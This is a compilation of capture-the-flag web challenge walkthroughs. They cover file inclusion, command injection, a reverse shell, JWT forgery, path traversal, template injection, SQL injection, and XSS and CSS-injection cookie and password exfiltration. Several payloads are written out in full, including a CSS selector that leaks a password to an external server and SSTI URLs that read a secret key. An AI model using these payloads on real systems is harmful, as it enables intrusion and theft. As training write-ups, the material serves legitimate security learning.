"When you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet.

Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.
In it there is the `/?file=checkpass.php` file disallowed.

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python` using `requests`, you can see that the response text says: ""IMPORTANT!!! The page is still under development. This has a secret, do not push this page.""

We can try to view the source of this page with the help of `php://filter`. Visit the website a base64 encoded string.

When you base64 decode this, you get some PHP code:
[This code shows the password as hardcoded, and that it's a cookie password. The page also contains an advice to not to push this page. The last line of the code redirects you to the homepage.]

Let's also check the source for `wc.php`. 

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`w0rdc0unt123`), then you can see the webpage.

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload: `'; ls #`

You can see the following output: ""The Character Count is: wc.php""

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.
[Reverse shell payload: Execute a command to establish a reverse shell connection to your server]

Once you pass this in the input, you get a shell on your server!

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

There's also a a bash script called`findaas`, which you can be used to locate the file `flag.txt`. Alternatively, you can use the find command directly.

Now that you know where the flag is located, you can try to read the contents of the file using the cat command. However, when you try to read the flag file, you get a ""Permission denied"" error.

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `6f246c872cbf0b7fd7530b7aa235e67e`. You can bruteforce that using offline tools or using [crackstation.net], and find out that the password is `csictf` (maybe you could've guessed it too).

Now, you can switch to the `ctf` user using the `su` command with the password `csictf`.
Finally, you can print the flag by using the cat command with the flag file path.
"
"Flag in CSS.

Checkout the flag in `/static/style.css`.
"
"Description: ""You can steal a car if you steal its key.""

First, in the website source, you can see that there's a route to login (`/login`) and a route to get the names of the admins (`/adminNames`). So, when you try to visit `/login`, you see a form. Post that and check the response on the Network Tab in your browser. You can see there's a header called `token` which stores a JWT. You can decode the token (maybe on `jwt.io` to see that the payload is the following (I typed username: asd, password: asd):
`{ ""username"": ""nfq"", ""password"": ""nfq"", ""admin"": ""snyfr"", ""iat"": 1593506966 }`

We can see that the `username` changed from `asd` to `nfq`. So this hints that this could be `rot13`. When you apply the `rot13` cipher on the admin value `snyfr`, you see that it returns a string `false`. So, we can change this to a rot13 encrypted string for `true`, but to do that, we need the JWT secret.

On going back to the page, you see there's a route called `/adminNames`. It downloads a file for you, which has sort of a URL: `csivitu/authorized_users/blob/master/`. Seems familiar? This looks like a GitHub URL. So, if you visit that repository on GitHub, and checkout the `root`, you can see a list of usernames. These are the usernames of the website admins!

Now, in the JWT you were creating, you can change the `username` key to a rot13 encrypted version of one of these, for example, `ebrebuna` is the rot13 encrypted ciphertext for `roerohan`. Here's what our JWT payload looks like now:
`{ ""username"": ""ebrebuna"", ""password"": ""nfq"", ""admin"": ""gehr"", ""iat"": 1593506966 }`

But, we still need the JWT secret. If you observe the request on `/adminNames`, you see that it actally redirects to `/getFile?file=admins`. This route seems suspicious. We can try to include other files using this. When you try `/getFile?file=.env`, it returns `No such file or directory: /app/public/.env`. So, we can try `../.env` to come out of the public folder. You get a file in return, which is the `.env` containing the secret!

Now, visit the /admin route. It says that the token is invalid, so you'll have to pass the JWT in the headers. Auth tokens are generally passed in the Authorization header, so let's try that. When you pass the new formed JWT in the Authorization header, you can do this using python.
[Python snippet: Send a GET request to the /admin route with the JWT in the Authorization header]

The text in the response is:
""Hey roerohan! Here's your flag: pfvpgs{1a_gu3_3aq_1g_q0rfa'g_3i3a_z4gg3e}""

rot13 decrypt this flag to get the real flag.
"
"Description: ""This is my file library. I don't have a lot of files, but I hope you like the ones I have!""

This exploit is owing to the `qs` package used by `express` to parse `req.query`. You can send an array instead of a string through the GET params in the following manner:
[GET request with an array as a parameter]

This makes the `req.names` in the backend an array: `['hello', 'world']`.
[JavaScript code of a simple Express app with a /getFile route and other routes]

The `/getFile` route is meant to get you a file from the server. But there are certain restrictions. First, you can't have ` `s or `/`s in your file. This prevents path traversal to an extent. 

Then, it checks that the `file` parameter has a length of less than 5 characters. If not, it takes just the first 5 characters. Then, it checks if the file extension is `js`, `ts`, `cpp`, or `c`, if yes, it allows you to read that file. If all these are satisfied, the path is resolved using `path.resolve()`.

In the `a.cpp` file, it says `system(""cat flag.txt"")`, indicating that the flag is present in the same directory in the `flag.txt`. We can pass in an array which passes the first 2 checks. Then it has to check if the `.slice(file.indexOf('.') + 1)`, so the last 2 elements have to be `['.', 'js']`. So, we can try passing `['flag.txt', '.', 'js']`, which makes the path `/home/user/flag.txt,.,js`, which is invalid. However, we can make use of the `path.resolve()`, and the fact that only the first 5 elements are used. If the array becomes `['a', 'b', 'c', 'd', '/../flag.txt', '.', 'js']` (`js` because `txt` is not allowed). So, this passed the file check, because `.slice()` returns `['js']` and `['js'] == 'js'` is true (not used `===`). Now, to get rid of this, we add 4 random elements before the element having `flag.txt`.

Now, the string upon concatenation will give `${pwd}/a,b,c,d,/../flag.txt` (now you see why we added `/../`), so that it resolves to `${pwd}/flag.txt` because of `flag.txt`. The payload, therefore, is:
`/getFile?file[]=a&file[]=b&file[]=c&file[]=d&file[]=/../flag.txt&file[]=.&file[]=js`

And you can get the flag.
"
"Description: ""People who get violent get that way because they canaTMt communicate.""

When you google the challenge description, you find out that the quote is from Mr. Robot. This indicates that the user might want to check out the `robots.txt` for the website.

When you open the website, it serves the `index.html` file, which has content written about `Brobot`, again trying to put across `robots.txt`.

When you visit `robots.txt` and visit the disallowed route, you get the flag!
"
"Description: ""This is a super secure portal with a really unusual HTML file. Try to login.""

You need to view the page source.

On seeing it, you will realize that this script has been obsfucated, and is checking for the password for this portal. The list `var _0x575c` has been encoded to hex, which translates to this.
`var _0x575c = [""2-4"", ""substring"", ""4-7"", ""getItem"", ""deleteItem"", ""12-14"", ""0-2"", ""setItem"", ""9-12"", ""^7M"", ""updateItem"", ""bb="", ""7-9"", ""14-16"", ""localStorage""];`

Now, in the function `CheckPassword`, you see the word `window` being repeated many times. For an example, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x2]]` is actually `window.localStorage.setItem` and so on. The password has been split to many parts. This command stores each part of the password to an assigned key.
Similarly, the line `window[_0x4bbdc3[0x0]][_0x4bbdc3[0x1]]` is `window.localStorage.getItem`. We use this command to check the splitted password with our input password. The password is `5W$Fbb=+nBE*pg4t^7M`.
"
"Description: ""Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.""

This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type=""password""][value^=""c""] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.

You may pass a long list of such CSS selectors, for all letters.

This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.

An so on, until you find the entire password. You can test this on your browser by storing a cookie called `password` with the value `csictf`. Now pass the following to get a request on your server (replace example.com with your server).

Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag.

Using this method, you can progressively leak the entire password and obtain the flag.
"
"Description ""You may think I walk with no 'name' because it can be changed whenever I want. I am a 'person' whose 'secret' can never be found. Can you find this 'person's 'secret'?
(I love you 8000.)""

This challenge involves exploiting the server script through Tornado template injection to obtain the cookie secret and forging a signed cookie to access the flag.

- The server script runs on `http://chall.csivit.com:30279/`. Input is taken as the ""icecream"" value. 
 
- A secure cookie is being set and compared to print a flag value. In tornado, signed cookies contain the encoded value of the cookie
  alongwith a timestamp and an HMAC signature. Such cookies are supported by the set_secure_cookie and get_secure_cookie methods which require a specific secret key: cookie_secret.

- Upon visiting `http://chall.csivit.com:30279/?icecream={{globals()}}`, you see something useful:
`'application': <tornado.web.Application object at 0x7f2976579750>`

- You now know that the name of the variable `tornado.web.Application(...)` is `application`.

- Run the server script with the exploit payload `http://chall.csivit.com:30279/?icecream={{application.settings[""cookie_secret""]}}` to get the cookie_secret value `MangoDB` displayed on the website.
  
- Replace the value of the secure cookie `admin` to the required comparison value `true` to obtain a signed cookie on the browser. Now, replace the signed cookie generated upon running the server script with the one obtained after the secure cookie value was set to `true`. This results in a cookie which looks like the following. Note `dHJ1ZQ==` is base64 for `true`.
""2|1:0|10:1594808471|5:admin|8:dHJ1ZQ==|5da7d1e446451e825e42001e7f07360e2e2e77c9c68b14fca1a517259712cdac""

- Upon reloading the server script, the text on the website would change from `Unfortunately, you aren't worthy` to the flag value.
"
"In this challenge, you can see the `index.php` code by default.

So, you see that we have to match the value of `hash` and `target`. It is checked that the `hash` param does not equal `10932435112`, but again it checks that the sha1 hash of `hash` is equal to that of `10932435112`. We know that the sha1 hashes will not match ever, so it's not a bruteforce challenge. Later, you notice that the `$hash` and the `$target` and matched using `==` and not `====`. `==` is vulnerable to type juggling!

If you see the hash of `10932435112`, it starts with `0e...`. So any other hash which starts with `0e` will match this with `==`, since `==` does not check types, so these will be treated as numbers. So, you have to bruteforce considerably lesser amount of values. 

You would find a lot of matches.

Pass any of these with the GET param `hash`, and you get the flag.
"
"When you look at the documentation for the source for the `flask_caching` module, you can optionally store a python pickle in the redis by prepending it with `'!'`. You can use python pickles for RCE, when the caching modules uses `pickle.load()` to load the cached data.

Set up a netcat listener on your server and run the following script with your IP and PORT.
[Python script: Create a payload for RCE and send it to the server]

On your netcat listener, you would get the flag.
[HTTP POST request with the flag]
"
"The critical line in the code is:
[Python code: Use subprocess.Popen to call FFmpeg]

Here, you can perform Remote Code Execution (RCE) with the file name. The idea is to grep the flag from the main.py file and write it on the image to which the GIF is going to be converted. This can be done with the -vf drawtext=... option. The payload used is:
[Payload: Include grep and drawtext options in the file name]

When you upload a GIF with this payload as the file name, you will receive a resulting PNG with the flag written on it.
"
"In this challenge, you see a bunch of captcha's floating around on your screen, and the goal is to successfully get 5 captchas. There's many ways to solve this, here's what was done:

When you see the source, this is the function which creates the captchas and makes them move:
[JavaScript code: Captcha creation and movement function]

To make it easier to solve the captchas, modify this function using your browser's developer tools, removing the part where it runs the loop, which is responsible for moving the captchas.
[Modified JavaScript code: Captcha creation function without movement]

Now, you can manually add 5 captchas and get them. Just call the function `addCaptcha()` and keep clicking the boxes. When you're done with 5, click on `GET FLAG`, and copy the flag from the screen!
"
"The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. The flag is right in front of you.""

Upon opening the link, an image is displayed, which hints at Sweden. So, the solution involves setting the language headers to Swedish using a ""curl"" command.
[Shell command: Set Accept-Language header to Swedish]

Executing this command returns the flag.
"
"The challenge gives us the following text:
""Normal fries are nice, but everything's better with a curl in it. Why do logos make things so recognizable?""

Upon opening the link, an image is displayed that shows the logos of Xbox and Linux. This is viewed on a Windows device.

To change the User-Agent to Linux, use the following command:
[Shell command: Set User-Agent header to Linux]

Executing this command returns a response with the Linux logo gone.

Next, set the User-Agent to both Linux and Xbox:
[Shell command: Set User-Agent header to Linux Xbox]

Executing this command gives the flag inside the body of the page.
"
"The challenge provides the following hint: ""Normal fries are nice, but everything's better with a curl in it. I'm with you, every step of the way.""

Upon opening the link, an image is displayed. To solve the challenge, a series of curl commands were executed with various headers, cookies, and JSON data. Here's the process:

Change the method to POST and send a request to the URL.

Set the Referer header to Google and send a request to the URL. In response, you receive a hint to attend a dinner party hosted by dscvit.

Set the Host header to dscvit.com and send a request to the URL. The response mentions potatoes, carrots, milk, and cookies.

Set the user cookie to ""root"" and send a request to the URL, as potatoes and carrots are root vegetables. The response contains a JSON-related hint.

Set the Content-Type header to application/json, include JSON data, and send a request to the URL. The response points out that ""messi"" is required in the JSON data.

Add ""messi"" to the JSON data and send a request to the URL. The response asks for the club Messi is in.
Change the ""messi"" value to ""psg"" and send a request to the URL, since Messi is playing for PSG at the time.

After executing the final command, the flag is returned."
"This Python script demonstrates an SQL Injection attack to solve the ""Taxi Union"" and ""Gate Keeper"" challenges. The script performs the following steps:
[Import the necessary libraries and initialize the variables.
Set the appropriate URL, check string, key, and column values based on the selected challenge (either ""Taxi Union"" or ""Gate Keeper"").
Iterate through each character in the domain (letters, digits, and special characters) while searching for the flag.
For each character, create an SQL injection payload that checks if the current flag value concatenated with the character is a prefix of the targeted column's value.
Send an HTTP POST request to the URL with the payload as the form data.
If the check string is found in the response, it means the character is part of the flag. Add the character to the flag and continue iterating through the domain.
Repeat the process until the entire flag is discovered.]

The Python script helps to find the flag by exploiting SQL injection vulnerability in the web application.
"
"The challenge begins with the given text: ""There is nothing here I promise! ;)""

Upon opening the link, an image is displayed. By checking the network tab, a response header with a specific string is found. A curl request is then sent, setting the cookie to the given string.

The response contains another string. A new curl request is sent with this new string as the cookie.

To automate this process, a Python script is written:
[Define the initial URL and the first flag value.
Create a loop that continues until the final flag value, 'EOF', is found.
In each iteration, send an HTTP GET request to the URL with the current flag value as a cookie.
Append the received string to the list of flags and continue iterating.
Once the loop is finished, print the received strings.]

The output contains multiple strings, which appear to be MD5 hashes. After decoding these hashes, a sequence of characters is obtained, which is the flag.
"
"This solution demonstrates a SQL Injection attack to solve a CTF challenge. The script also works for the `Gate Keeper` challenge. Here's a high-level explanation of the Python script:
[Import the necessary libraries: `requests` and `string`.
Initialize an empty `flag` variable, and define the search domain containing all possible characters.
Set the challenge, URL, check, key, and column variables based on the challenge being solved (either ""taxi union"" or ""gate keeper"").
Enter an infinite loop that iterates through each character in the search domain.
For each character, create a payload containing a SQL injection query using the current flag and character.
Send an HTTP POST request to the URL with the payload as the data.
Check if the expected response text is found in the received response.
If the expected response is found, add the character to the flag and print it.
Break the loop once the flag is found.]

The script automates the process of testing various payloads to exploit the SQL Injection vulnerability and retrieve the flag.
"
"When you examine the source code, you'll notice the application uses `bodyParser.urlencoded` with `extended: true`. This allows arrays and objects to be passed in the request body. In the `/login` POST route, the output has not been stringified, so it is possible to pass an object in the query statement.
[JavaScript code: Configure bodyParser and create SQL query]

The exploit is to pass an object as the password parameter, with a known attribute. This causes the SQL query to be evaluated in a way that allows logging in without knowing the correct password. We'll refer to the official `mysql` docs for more information on how objects are converted into comma-separated attributes in SQL queries.

The final payload for this exploit is:
[HTTP POST request: Send payload with object as password]

From here, you can just take the cookie you received, and use that to visit `/flag`. Alternatively, you can use a Python script to automate the process:
[Python script: Send payload, get the flag, and print it]

You can run this script and use `grep` to find the flag.
"
"When you visit the website, you find that there's a cookie containing a JWT. It's hashed using `HS256`. The JWT secret was brute-forced using `rockyou.txt` and John The Ripper, which revealed the secret as `supersecret`. Using this secret, a JWT with `username: admin` was created and added to the cookie, logging in as admin.

Visiting a random route starting with `/admin/` that throws a 404 error, it was observed that there's scope for template injection in the 404 page. By climbing up the Python MRO using `__class__` and `__bases__`, etc., a list of all available classes was found. At index 405, the `subprocess.Popen` class was discovered.

Using this class, a reverse shell was spawned by sending a specially crafted URL. A netcat listener was started on the server at the specified port, which ultimately led to gaining a shell.

Upon listing the files and reading the content of `flag.txt`.
"
"The challenge is very simple once you know what to do.
This is the hint:
""We will only give our flag to our Agent 95! He is still running an old version of Windows...""

We assume Agent 95 uses Windows 95. So just change the `User-Agent` header to `Mozilla/4.0 (compatible; MSIE 4.01; Windows 95)`.

We use a Python script:
[Python code: using `requests` to send a GET with the `User-Agent` header]

In the response, you got the flag.
"
"Well, if you happen to look at the local storage, you'll get the flag directly. But that's not how we got it because we're stupid. So, here's what we did.

You see a JS file in the sources: `jquery.jscroll2.js`. Now, to understand what exactly it does, we first convert the huge list on `line 1` from `hex` to `string` to be able to make sense of it. So let's convert it using a script written in `python2`.

Once you convert it, you will see some meaningful strings such as `localStorage`, `setItem`, `data`, `defaults`, `extend`, `function`, etc..

Now we can try to make sense of the rest of the code. We see a line:
```javascript
window[_0xbcec[8]][_0xbcec[7]](_0xbcec[5], atob(_0xbcec[6]));
```

Now that we have the strings figured out, we can translate this to:
```javascript
window['localstorage']['setItem']('flag', atob('SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9'))
```

So the script basically converst the `base64` string `SkNURntzcG9vb29va3lfZ2hvc3RzX2luX3N0b3JhZ2V9` and stores it in local storage with the key `flag`. Well, now you can just check the local storage, or just convert this string to ASCII using BASH.
"
"Press `Ctrl + U` on your browser to view the source code of the `HTML` file. Search for `flag{...}`. 
[HTML source code with flag]
"
"This is a beginner SQL Injection challenge. To retrieve the flag, you need to inject a malicious SQL query into the login form.

Simply pass the username and the password as ' or 1=1 -- , which will be interpreted as a SQL query that always returns true, and comment out the rest of the query with the -- symbol. This will cause the server to execute the SQL query as if you had provided valid login credentials, resulting in an alert box displaying the flag.
"
"[This challenge involves exploiting a vulnerability in the `generateToken` function in a JavaScript file. The function generates a token for a given `username`, where the `username` is included as a string in a JSON object that is encrypted using `aes-192-cbc`. However, the function forms the JSON object in a way that allows the "" character to be closed with the help of the string passed in the `username` parameter, and sets the `member` field to a non-zero value.]

You really just need to notice this function. Notice, the token is not created like `token.username = username`. It's formed in the following way:
```
const token = `{""integrity"":""${INTEGRITY}"",""member"":0,""username"":""${username}""}`
```

To exploit the vulnerability, we can pass the `username` as `"",""member"":""1` which will close the `""` character and set `member` to `1`. Then, we can visit `/api/flag` to get the flag in JSON format.
"
"This challenge uses XSS to get the flag from the `admin bot's` cookies.

First, try a random `<h1>Hello</h1>` tag to see if you can put HTML in your pastebin.

Inspecting the `js` file of the page we can can infer 2 things:
- the content of the page is obtained from the URL, which is a base64 encoded form of the text you entered.
- the `clean` function will not allow writing of text if bracket pairs do not match.

It is rather easy to break this `clean` function, by adding an extra `>` at the starting of your XSS script. Here's the payload:
[Payload for XSS attack with an extra "">"" at the beginning of the script]

Your payload has the following URL:
[URL with base64 encoded payload]

You can simply set up a `netcat listener` using `nc -l port` on your server, and pass the link to the `Admin Bot`. The admin bot is basically a headless chrome browser which has the flag in it's cookies. When it visits your site, the XSS steals the cookies from the admin bot and sends it to your server. You get a request which looks like:
[HTTP GET request with the flag in the cookie]
"
"This site allows you to write HTML, so it's basically shouting at you to perform an XSS attack. The URL of the webpage created actually consists a base64 encoded form of the content of the page. We can see the `js` in the source.

The main thing we notice is that it prevents `script` tags and it allows only the following attributes for an element: `'src', 'width', 'height', 'alt', 'class'`. So we have to perform an XSS with these attributes. So, here's the payload:
[Payload for XSS attack using an iframe and the 'src' attribute]

Note that here, the site is supposed to be `https`, otherwise there will be a Content Security Policy Bypass (CSP Bypass) error, and the request won't be sent. We can get the URL of the resulting webpage:
[URL with base64 encoded payload]

On the server, we can create a simple Node.js backend which accepts the cookie as a query param and logs it. Here's an example of the backend code:
[Node.js code for a simple backend to log the stolen cookie]

When the link for the website is sent to the `admin bot`, which is basically a headless chrome browser, it visits the page and it's cookie is stolen and sent to the server at `myserver.tld`. The cookie stores the `flag`.
"
"The first part of the challenge is a sort of vague guesswork. In the challenge description, there are two words - `page` and `upload` - which the author wants you to notice. Also, when you view the homepage source, it has a comment `<!-- get the 'page' :eyes: -->`. 

So, the first try was to pass a query `page` in the flag. So, we tried to visit `http://web.zh3r0.ml:7777/?page=flag`. Here, we get a gif.

Now, since the description had the word `upload` in it, we tried to checkout if there is a page called upload, and there was!

Here, we can assume that we have to do some sort of local file inclusion. So we created a file called `payload.php`, and tried to `ls` the directory. We saw a lot of files called `flag`, so we just decided to print all files and just search on the browser.

Here's the final payload for the PHP code:
[PHP code payload for local file inclusion to find all files and print them]

Now you can visit the route `/?page=payload` (name of the file you uploaded). This gives a page with a lot of stuff.

So, the contents of all the files are now on the browser. All you have to do is open the source code and search for the flag format.
"
